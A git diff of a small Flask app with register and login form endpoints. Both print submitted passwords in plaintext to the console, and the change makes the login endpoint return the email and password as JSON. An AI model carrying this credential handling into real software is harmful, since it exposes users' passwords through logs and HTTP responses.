@@ -1,4 +1,4 @@
-from flask import Flask, request
+from flask import Flask, request, jsonify
 from flask_cors import CORS
 
 app = Flask(__name__)
@@ -13,12 +13,20 @@ def register_form():
     print(f"La page de Register à récupérer => Nom: {nom} Email: {email}, Password: {password}", flush=True)
     return "OK"
 
+# -------------------------------------------
+# 1) LOGIN : renvoie un JSON propre
+# -------------------------------------------
 @app.route("/login_form", methods=["POST"])
-def login_Form():
-    email = request.form.get("email")
+def login_form():
+    email    = request.form.get("email")
     password = request.form.get("password")
-    print(f"La page de Login à récupérer => Email: {email}, Password: {password}", flush=True)
-    return "OK"
 
+    print(f"[LOGIN] Email: {email}  Password: {password}", flush=True)
+    return jsonify({"email": email, "password": password})
+
+# -------------------------------------------
+# 2) LANCEMENT
+# -------------------------------------------
 if __name__ == "__main__":
     app.run(port=5000)
+
